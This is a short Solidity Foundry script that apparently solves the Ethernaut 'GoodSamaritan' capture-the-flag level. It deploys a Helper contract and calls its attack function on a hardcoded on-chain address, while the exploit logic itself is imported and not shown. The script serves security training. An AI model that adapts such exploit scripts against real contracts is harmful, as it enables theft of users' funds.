// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {GoodSamaritan} from "../../src/Ethernaut/GoodSamaritan.sol";
import {Helper} from "../../test/Ethernaut/GoodSamaritan.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        GoodSamaritan goodSamaritan = GoodSamaritan(
            0xD221BB792ee9D9f273070B35F33Ffb966d174766
        );
        helper.attack(goodSamaritan);
        vm.stopBroadcast();
    }
}
